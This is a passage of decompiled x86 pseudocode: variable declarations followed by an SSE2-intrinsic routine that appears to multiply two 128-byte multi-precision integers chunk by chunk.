  __m128i v286; // xmm4
  __m128i v287; // xmm5
  int v288; // ecx
  __m128i v289; // xmm6
  __m128i v290; // xmm5
  __m128i v291; // xmm4
  __m128i *v292; // edx
  __m128i v293; // xmm7
  __m128i v294; // xmm0
  __m128i v295; // xmm7
  __m128i v296; // xmm6
  __m128i v297; // xmm4
  __m128i v298; // xmm5
  __m128i v299; // xmm6
  __m128i v300; // xmm7
  __m128i v301; // xmm0
  __m128i v302; // xmm1
  __m128i v303; // xmm4
  __m128i v304; // xmm5
  int v305; // ecx
  __m128i v306; // xmm6
  __m128i v307; // xmm5
  __m128i v308; // xmm4
  __m128i v309; // xmm7
  __m128i v310; // xmm0
  __m128i *v311; // edx
  __m128i v312; // xmm7
  __m128i v313; // xmm6
  __m128i v314; // xmm4
  __m128i v315; // xmm5
  __m128i v316; // xmm6
  __m128i v317; // xmm7
  __m128i v318; // xmm0
  __m128i v319; // xmm1
  __m128i v320; // xmm4
  __m128i v321; // xmm5
  int v322; // ecx
  __m128i v323; // xmm6
  __m128i v324; // xmm5
  __m128i v325; // xmm4
  __m128i *v326; // edx
  __m128i v327; // xmm7
  __m128i v328; // xmm0
  __m128i v329; // xmm7
  __m128i v330; // xmm6
  __m128i v331; // xmm4
  __m128i v332; // xmm5
  __m128i v333; // xmm6
  __m128i v334; // xmm7
  __m128i v335; // xmm0
  __m128i v336; // xmm1
  __m128i v337; // xmm4
  __m128i v338; // xmm5
  int v339; // ecx
  __m128i v340; // xmm6
  __m128i v341; // xmm5
  __m128i v342; // xmm4
  __m128i v343; // xmm7
  __m128i v344; // xmm0
  __m128i *v345; // edx
  __m128i v346; // xmm7
  __m128i v347; // xmm6
  __m128i v348; // xmm4
  __m128i v349; // xmm5
  __m128i v350; // xmm6
  __m128i v351; // xmm7
  __m128i v352; // xmm0
  __m128i v353; // xmm1
  __m128i v354; // xmm4
  __m128i v355; // xmm5
  int v356; // ecx
  __m128i v357; // xmm6
  __m128i v358; // xmm5
  __m128i v359; // xmm4
  __m128i *v360; // edx
  __m128i v361; // xmm7
  __m128i v362; // xmm0
  __m128i v363; // xmm7
  __m128i v364; // xmm6
  __m128i v365; // xmm4
  __m128i v366; // xmm5
  __m128i v367; // xmm6
  __m128i v368; // xmm7
  __m128i v369; // xmm0
  __m128i v370; // xmm1
  __m128i v371; // xmm4
  __m128i v372; // xmm5
  int v373; // ecx
  __m128i v374; // xmm6
  __m128i v375; // xmm5
  __m128i v376; // xmm4
  __m128i v377; // xmm7
  __m128i v378; // xmm0
  __m128i *v379; // edx
  __m128i v380; // xmm7
  __m128i v381; // xmm6
  __m128i v382; // xmm4
  __m128i v383; // xmm5
  __m128i v384; // xmm6
  __m128i v385; // xmm7
  __m128i v386; // xmm0
  __m128i v387; // xmm1
  __m128i v388; // xmm4
  __m128i v389; // xmm5
  int v390; // ecx
  __m128i v391; // xmm6
  __m128i v392; // xmm5
  __m128i v393; // xmm4
  __m128i *v394; // edx
  __m128i v395; // xmm7
  __m128i v396; // xmm0
  __m128i v397; // xmm7
  __m128i v398; // xmm6
  __m128i v399; // xmm4
  __m128i v400; // xmm5
  __m128i v401; // xmm6
  __m128i v402; // xmm7
  __m128i v403; // xmm0
  __m128i v404; // xmm1
  __m128i v405; // xmm4
  __m128i v406; // xmm5
  int v407; // ecx
  __m128i v408; // xmm6
  __m128i v409; // xmm5
  __m128i v410; // xmm4
  __m128i v411; // xmm7
  __m128i v412; // xmm0
  __m128i *v413; // edx
  __m128i v414; // xmm7
  __m128i v415; // xmm6
  __m128i v416; // xmm4
  __m128i v417; // xmm5
  __m128i v418; // xmm6
  __m128i v419; // xmm7
  __m128i v420; // xmm0
  __m128i v421; // xmm1
  __m128i v422; // xmm4
  __m128i v423; // xmm5
  int v424; // ecx
  __m128i v425; // xmm6
  __m128i v426; // xmm5
  __m128i v427; // xmm4
  __m128i *v428; // edx
  __m128i v429; // xmm7
  __m128i v430; // xmm0
  __m128i v431; // xmm7
  __m128i v432; // xmm6
  __m128i v433; // xmm4
  __m128i v434; // xmm5
  __m128i v435; // xmm6
  __m128i v436; // xmm7
  __m128i v437; // xmm0
  __m128i v438; // xmm1
  __m128i v439; // xmm4
  __m128i v440; // xmm5
  int v441; // ecx
  __m128i v442; // xmm6
  __m128i v443; // xmm5
  __m128i v444; // xmm4
  __m128i v445; // xmm7
  __m128i v446; // xmm0
  __m128i *v447; // edx
  __m128i v448; // xmm7
  __m128i v449; // xmm6
  __m128i v450; // xmm4
  __m128i v451; // xmm5
  __m128i v452; // xmm6
  __m128i v453; // xmm7
  __m128i v454; // xmm0
  __m128i v455; // xmm1
  __m128i v456; // xmm4
  __m128i v457; // xmm5
  int v458; // ecx
  __m128i v459; // xmm6
  __m128i v460; // xmm5
  __m128i v461; // xmm4
  __m128i *v462; // edx
  __m128i v463; // xmm7
  __m128i v464; // xmm0
  __m128i v465; // xmm7
  __m128i v466; // xmm6
  __m128i v467; // xmm4
  __m128i v468; // xmm5
  __m128i v469; // xmm6
  __m128i v470; // xmm7
  __m128i v471; // xmm0
  __m128i v472; // xmm1
  __m128i v473; // xmm4
  __m128i v474; // xmm5
  int v475; // ecx
  __m128i v476; // xmm6
  __m128i v477; // xmm5
  __m128i v478; // xmm4
  __m128i v479; // xmm7
  __m128i v480; // xmm0
  __m128i *v481; // edx
  __m128i v482; // xmm7
  __m128i v483; // xmm6
  __m128i v484; // xmm4
  __m128i v485; // xmm5
  __m128i v486; // xmm6
  __m128i v487; // xmm7
  __m128i v488; // xmm0
  __m128i v489; // xmm1
  __m128i v490; // xmm4
  __m128i v491; // xmm5
  int v492; // ecx
  __m128i v493; // xmm6
  __m128i v494; // xmm5
  __m128i v495; // xmm4
  __m128i *v496; // edx
  __m128i v497; // xmm7
  __m128i v498; // xmm0
  __m128i v499; // xmm7
  __m128i v500; // xmm6
  __m128i v501; // xmm4
  __m128i v502; // xmm5
  __m128i v503; // xmm6
  __m128i v504; // xmm7
  __m128i v505; // xmm0
  __m128i v506; // xmm1
  __m128i v507; // xmm4
  __m128i v508; // xmm5
  int v509; // ecx
  __m128i v510; // xmm6
  __m128i v511; // xmm5
  __m128i v512; // xmm4
  __m128i v513; // xmm7
  __m128i v514; // xmm0
  __m128i *v515; // edx
  __m128i v516; // xmm7
  __m128i v517; // xmm6
  __m128i v518; // xmm2
  __m128i v519; // xmm5
  __m128i v520; // xmm6
  __m128i v521; // xmm7
  __m128i v522; // xmm0
  __m128i v523; // xmm1
  __m128i v524; // xmm4
  __m128i v525; // xmm5
  __m128i v526; // xmm6
  __m128i v527; // [esp+10h] [ebp-30Ch] BYREF
  __m128i v528; // [esp+20h] [ebp-2FCh] BYREF
  __m128i v529; // [esp+30h] [ebp-2ECh] BYREF
  __m128i v530; // [esp+40h] [ebp-2DCh] BYREF
  __m128i v531; // [esp+50h] [ebp-2CCh] BYREF
  __m128i v532; // [esp+60h] [ebp-2BCh] BYREF
  __m128i v533; // [esp+70h] [ebp-2ACh] BYREF
  __m128i v534; // [esp+80h] [ebp-29Ch] BYREF
  __m128i v535; // [esp+90h] [ebp-28Ch] BYREF
  __m128i v536; // [esp+A0h] [ebp-27Ch] BYREF
  __m128i v537; // [esp+B0h] [ebp-26Ch] BYREF
  __m128i v538; // [esp+C0h] [ebp-25Ch] BYREF
  __m128i v539; // [esp+D0h] [ebp-24Ch] BYREF
  __m128i v540; // [esp+E0h] [ebp-23Ch] BYREF
  __m128i v541; // [esp+F0h] [ebp-22Ch] BYREF
  __m128i v542; // [esp+100h] [ebp-21Ch] BYREF
  __m128i v543; // [esp+110h] [ebp-20Ch]
  __m128i v544[15]; // [esp+120h] [ebp-1FCh]
  __m128i v545; // [esp+210h] [ebp-10Ch] BYREF
  __m128i v546; // [esp+220h] [ebp-FCh] BYREF
  __m128i v547; // [esp+230h] [ebp-ECh] BYREF
  __m128i v548; // [esp+240h] [ebp-DCh] BYREF
  __m128i v549; // [esp+250h] [ebp-CCh] BYREF
  __m128i v550; // [esp+260h] [ebp-BCh] BYREF
  __m128i v551; // [esp+270h] [ebp-ACh] BYREF
  __m128i v552; // [esp+280h] [ebp-9Ch] BYREF
  __m128i v553; // [esp+290h] [ebp-8Ch] BYREF
  __m128i v554; // [esp+2A0h] [ebp-7Ch] BYREF
  __m128i v555; // [esp+2B0h] [ebp-6Ch] BYREF
  __m128i v556; // [esp+2C0h] [ebp-5Ch] BYREF
  __m128i v557; // [esp+2D0h] [ebp-4Ch] BYREF
  __m128i v558; // [esp+2E0h] [ebp-3Ch] BYREF
  __m128i v559; // [esp+2F0h] [ebp-2Ch] BYREF
  __m128i v560; // [esp+300h] [ebp-1Ch] BYREF

  for ( i = 0; i != 128; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v527 + 2 * i) = v4;
    *(__m128i *)((char *)&v528 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v543 + 2 * i) = v5;
    v544[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v545 + 2 * i) = v6;
    *(__m128i *)((char *)&v546 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v545);
  v8 = _mm_mul_epu32(_mm_load_si128(&v527), v7);
  si128 = _mm_load_si128(&stru_4BACE0);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v543);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v545);
  v22 = _mm_mul_epu32(_mm_load_si128(&v528), v21);
  v23 = _mm_mul_epu32(v21, v544[0]);
  v24 = _mm_load_si128(&stru_4BACE0);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_445BC9((int)&v528, &v545);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v546);
  v38 = _mm_mul_epu32(_mm_load_si128(&v528), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_4BACE0);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_445B8C();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v546);
  v56 = _mm_mul_epu32(_mm_load_si128(&v529), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_4BACE0);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_445B4F();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v547);
  v72 = _mm_mul_epu32(_mm_load_si128(&v529), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_4BACE0);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_445B12();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v547);
  v90 = _mm_mul_epu32(_mm_load_si128(&v530), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_4BACE0);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_445AD5();
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v548);
  v106 = _mm_mul_epu32(_mm_load_si128(&v530), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_4BACE0);
  v110 = _mm_add_epi32(v104, _mm_and_si128(v109, v106));
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  sub_445A98();
  v114 = _mm_move_epi64(v112);
  v115 = _mm_move_epi64(v113);
  v116 = _mm_add_epi32(v110, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v114), v114), 4));
  v117 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v115), v115), 4));
  *(_DWORD *)(v118 + 48) = _mm_cvtsi128_si32(v116);
  v119 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v116), 0x10u), _mm_move_epi64(v117));
  v120 = _mm_unpackhi_epi64(v117, v114);
  *(_QWORD *)(v118 + 50) = v119.m128i_i64[0];
  v121 = _mm_add_epi32(_mm_unpackhi_epi64(v116, v114), _mm_srli_epi64(v119, 0x30u));
  v123 = _mm_load_si128(&v548);
  v124 = _mm_mul_epu32(_mm_load_si128(&v531), v123);
  v125 = _mm_mul_epu32(v123, v122[1]);
  v126 = _mm_load_si128(&stru_4BACE0);
  v127 = _mm_add_epi32(v121, _mm_and_si128(v126, v124));
  v128 = _mm_add_epi32(v120, _mm_srli_epi32(v124, 0x10u));
  v129 = _mm_and_si128(v126, v125);
  v130 = _mm_srli_epi32(v125, 0x10u);
  sub_445A5B();
  v131 = _mm_move_epi64(v129);
  v132 = _mm_move_epi64(v130);
  v133 = _mm_add_epi32(v127, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v129, v131), v131), 4));
  v134 = _mm_add_epi32(v128, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v130, v132), v132), 4));
  *(_DWORD *)(v135 + 56) = _mm_cvtsi128_si32(v133);
  v136 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v133), 0x10u), _mm_move_epi64(v134));
  v137 = _mm_unpackhi_epi64(v134, v131);
  *(_QWORD *)(v135 + 58) = v136.m128i_i64[0];
  v138 = _mm_add_epi32(_mm_unpackhi_epi64(v133, v131), _mm_srli_epi64(v136, 0x30u));
  v139 = _mm_load_si128(&v549);
  v140 = _mm_mul_epu32(_mm_load_si128(&v531), v139);
  v142 = _mm_mul_epu32(v139, *v141);
  v143 = _mm_load_si128(&stru_4BACE0);
  v144 = _mm_add_epi32(v138, _mm_and_si128(v143, v140));
  v145 = _mm_add_epi32(v137, _mm_srli_epi32(v140, 0x10u));
  v146 = _mm_and_si128(v143, v142);
  v147 = _mm_srli_epi32(v142, 0x10u);
  sub_445A1E();
  v148 = _mm_move_epi64(v146);
  v149 = _mm_move_epi64(v147);
  v150 = _mm_add_epi32(v144, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v146, v148), v148), 4));
  v151 = _mm_add_epi32(v145, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v147, v149), v149), 4));
  *(_DWORD *)(v152 + 64) = _mm_cvtsi128_si32(v150);
  v153 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v150), 0x10u), _mm_move_epi64(v151));
  v154 = _mm_unpackhi_epi64(v151, v148);
  *(_QWORD *)(v152 + 66) = v153.m128i_i64[0];
  v155 = _mm_add_epi32(_mm_unpackhi_epi64(v150, v148), _mm_srli_epi64(v153, 0x30u));
  v157 = _mm_load_si128(&v549);
  v158 = _mm_mul_epu32(_mm_load_si128(&v532), v157);
  v159 = _mm_mul_epu32(v157, v156[1]);
  v160 = _mm_load_si128(&stru_4BACE0);
  v161 = _mm_add_epi32(v155, _mm_and_si128(v160, v158));
  v162 = _mm_add_epi32(v154, _mm_srli_epi32(v158, 0x10u));
  v163 = _mm_and_si128(v160, v159);
  v164 = _mm_srli_epi32(v159, 0x10u);
  sub_4459E1();
  v165 = _mm_move_epi64(v163);
  v166 = _mm_move_epi64(v164);
  v167 = _mm_add_epi32(v161, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v163, v165), v165), 4));
  v168 = _mm_add_epi32(v162, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v164, v166), v166), 4));
  *(_DWORD *)(v169 + 72) = _mm_cvtsi128_si32(v167);
  v170 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v167), 0x10u), _mm_move_epi64(v168));
  v171 = _mm_unpackhi_epi64(v168, v165);
  *(_QWORD *)(v169 + 74) = v170.m128i_i64[0];
  v172 = _mm_add_epi32(_mm_unpackhi_epi64(v167, v165), _mm_srli_epi64(v170, 0x30u));
  v173 = _mm_load_si128(&v550);
  v174 = _mm_mul_epu32(_mm_load_si128(&v532), v173);
  v176 = _mm_mul_epu32(v173, *v175);
  v177 = _mm_load_si128(&stru_4BACE0);
  v178 = _mm_add_epi32(v172, _mm_and_si128(v177, v174));
  v179 = _mm_add_epi32(v171, _mm_srli_epi32(v174, 0x10u));
  v180 = _mm_and_si128(v177, v176);
  v181 = _mm_srli_epi32(v176, 0x10u);
  sub_4459A4();
  v182 = _mm_move_epi64(v180);
  v183 = _mm_move_epi64(v181);
  v184 = _mm_add_epi32(v178, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v182), v182), 4));
  v185 = _mm_add_epi32(v179, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v181, v183), v183), 4));
  *(_DWORD *)(v186 + 80) = _mm_cvtsi128_si32(v184);
  v187 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v184), 0x10u), _mm_move_epi64(v185));
  v188 = _mm_unpackhi_epi64(v185, v182);
  *(_QWORD *)(v186 + 82) = v187.m128i_i64[0];
  v189 = _mm_add_epi32(_mm_unpackhi_epi64(v184, v182), _mm_srli_epi64(v187, 0x30u));
  v191 = _mm_load_si128(&v550);
  v192 = _mm_mul_epu32(_mm_load_si128(&v533), v191);
  v193 = _mm_mul_epu32(v191, v190[1]);
  v194 = _mm_load_si128(&stru_4BACE0);
  v195 = _mm_add_epi32(v189, _mm_and_si128(v194, v192));
  v196 = _mm_add_epi32(v188, _mm_srli_epi32(v192, 0x10u));
  v197 = _mm_and_si128(v194, v193);
  v198 = _mm_srli_epi32(v193, 0x10u);
  sub_445967();
  v199 = _mm_move_epi64(v197);
  v200 = _mm_move_epi64(v198);
  v201 = _mm_add_epi32(v195, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v197, v199), v199), 4));
  v202 = _mm_add_epi32(v196, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v198, v200), v200), 4));
  *(_DWORD *)(v203 + 88) = _mm_cvtsi128_si32(v201);
  v204 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v201), 0x10u), _mm_move_epi64(v202));
  v205 = _mm_unpackhi_epi64(v202, v199);
  *(_QWORD *)(v203 + 90) = v204.m128i_i64[0];
  v206 = _mm_add_epi32(_mm_unpackhi_epi64(v201, v199), _mm_srli_epi64(v204, 0x30u));
  v207 = _mm_load_si128(&v551);
  v208 = _mm_mul_epu32(_mm_load_si128(&v533), v207);
  v210 = _mm_mul_epu32(v207, *v209);
  v211 = _mm_load_si128(&stru_4BACE0);
  v212 = _mm_add_epi32(v206, _mm_and_si128(v211, v208));
  v213 = _mm_add_epi32(v205, _mm_srli_epi32(v208, 0x10u));
  v214 = _mm_and_si128(v211, v210);
  v215 = _mm_srli_epi32(v210, 0x10u);
  sub_44592A();
  v216 = _mm_move_epi64(v214);
  v217 = _mm_move_epi64(v215);
  v218 = _mm_add_epi32(v212, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v214, v216), v216), 4));
  v219 = _mm_add_epi32(v213, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v215, v217), v217), 4));
  *(_DWORD *)(v220 + 96) = _mm_cvtsi128_si32(v218);
  v221 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v218), 0x10u), _mm_move_epi64(v219));
  v222 = _mm_unpackhi_epi64(v219, v216);
  *(_QWORD *)(v220 + 98) = v221.m128i_i64[0];
  v223 = _mm_add_epi32(_mm_unpackhi_epi64(v218, v216), _mm_srli_epi64(v221, 0x30u));
  v225 = _mm_load_si128(&v551);
  v226 = _mm_mul_epu32(_mm_load_si128(&v534), v225);
  v227 = _mm_mul_epu32(v225, v224[1]);
  v228 = _mm_load_si128(&stru_4BACE0);
  v229 = _mm_add_epi32(v223, _mm_and_si128(v228, v226));
  v230 = _mm_add_epi32(v222, _mm_srli_epi32(v226, 0x10u));
  v231 = _mm_and_si128(v228, v227);
  v232 = _mm_srli_epi32(v227, 0x10u);
  sub_4458ED();
  v233 = _mm_move_epi64(v231);
  v234 = _mm_move_epi64(v232);
  v235 = _mm_add_epi32(v229, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v231, v233), v233), 4));
  v236 = _mm_add_epi32(v230, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v232, v234), v234), 4));
  *(_DWORD *)(v237 + 104) = _mm_cvtsi128_si32(v235);
  v238 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v235), 0x10u), _mm_move_epi64(v236));
  v239 = _mm_unpackhi_epi64(v236, v233);
  *(_QWORD *)(v237 + 106) = v238.m128i_i64[0];
  v240 = _mm_add_epi32(_mm_unpackhi_epi64(v235, v233), _mm_srli_epi64(v238, 0x30u));
  v241 = _mm_load_si128(&v552);
  v242 = _mm_mul_epu32(_mm_load_si128(&v534), v241);
  v244 = _mm_mul_epu32(v241, *v243);
  v245 = _mm_load_si128(&stru_4BACE0);
  v246 = _mm_add_epi32(v240, _mm_and_si128(v245, v242));
  v247 = _mm_add_epi32(v239, _mm_srli_epi32(v242, 0x10u));
  v248 = _mm_and_si128(v245, v244);
  v249 = _mm_srli_epi32(v244, 0x10u);
  sub_4458B0();
  v250 = _mm_move_epi64(v248);
  v251 = _mm_move_epi64(v249);
  v252 = _mm_add_epi32(v246, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v248, v250), v250), 4));
  v253 = _mm_add_epi32(v247, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v249, v251), v251), 4));
  *(_DWORD *)(v254 + 112) = _mm_cvtsi128_si32(v252);
  v255 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v252), 0x10u), _mm_move_epi64(v253));
  v256 = _mm_unpackhi_epi64(v253, v250);
  *(_QWORD *)(v254 + 114) = v255.m128i_i64[0];
  v257 = _mm_add_epi32(_mm_unpackhi_epi64(v252, v250), _mm_srli_epi64(v255, 0x30u));
  v259 = _mm_load_si128(&v552);
  v260 = _mm_mul_epu32(_mm_load_si128(&v535), v259);
  v261 = _mm_mul_epu32(v259, v258[1]);
  v262 = _mm_load_si128(&stru_4BACE0);
  v263 = _mm_add_epi32(v257, _mm_and_si128(v262, v260));
  v264 = _mm_add_epi32(v256, _mm_srli_epi32(v260, 0x10u));
  v265 = _mm_and_si128(v262, v261);
  v266 = _mm_srli_epi32(v261, 0x10u);
  sub_445870();
  v267 = _mm_move_epi64(v265);
  v268 = _mm_move_epi64(v266);
  v269 = _mm_add_epi32(v263, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v265, v267), v267), 4));
  v270 = _mm_add_epi32(v264, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v266, v268), v268), 4));
  *(_DWORD *)(v271 + 120) = _mm_cvtsi128_si32(v269);
  v272 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v269), 0x10u), _mm_move_epi64(v270));
  v273 = _mm_unpackhi_epi64(v270, v267);
  *(_QWORD *)(v271 + 122) = v272.m128i_i64[0];
  v274 = _mm_add_epi32(_mm_unpackhi_epi64(v269, v267), _mm_srli_epi64(v272, 0x30u));
  v275 = _mm_load_si128(&v553);
  v276 = _mm_mul_epu32(_mm_load_si128(&v535), v275);
  v278 = _mm_mul_epu32(v275, *v277);
  v279 = _mm_load_si128(&stru_4BACE0);
  v280 = _mm_add_epi32(v274, _mm_and_si128(v279, v276));
  v281 = _mm_add_epi32(v273, _mm_srli_epi32(v276, 0x10u));
  v282 = _mm_and_si128(v279, v278);
  v283 = _mm_srli_epi32(v278, 0x10u);
  sub_4458B0();
  v284 = _mm_move_epi64(v282);
  v285 = _mm_move_epi64(v283);
  v286 = _mm_add_epi32(v280, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v282, v284), v284), 4));
  v287 = _mm_add_epi32(v281, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v283, v285), v285), 4));
  *(_DWORD *)(v288 + 128) = _mm_cvtsi128_si32(v286);
  v289 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v286), 0x10u), _mm_move_epi64(v287));
  v290 = _mm_unpackhi_epi64(v287, v284);
  *(_QWORD *)(v288 + 130) = v289.m128i_i64[0];
